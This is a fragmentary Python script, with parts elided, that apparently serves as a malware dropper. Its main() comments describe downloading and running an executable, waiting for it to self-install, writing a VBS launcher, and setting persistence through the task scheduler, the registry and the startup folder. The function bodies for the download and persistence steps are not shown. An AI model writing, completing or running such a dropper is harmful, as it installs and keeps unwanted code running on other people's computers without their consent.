...
'''
    with open(LAUNCHER_VBS, "w") as f:
        f.write(vbs_content)
    # Make sure the VBS is not deleted by accident
    return LAUNCHER_VBS
...
def main():
    ...
    # Step 1: Download and run the exe (same as before)
    ...
    # Wait a moment for the exe to self-install
    time.sleep(3)
    
    # Step 2: Create the VBS launcher
    create_vbs_launcher()
    
    # Step 3: Set up persistence (task scheduler + registry + startup)
    set_persistence_via_task_scheduler()
    set_persistence_registry_and_startup()

    # Optional: Run the VBS launcher once now to test
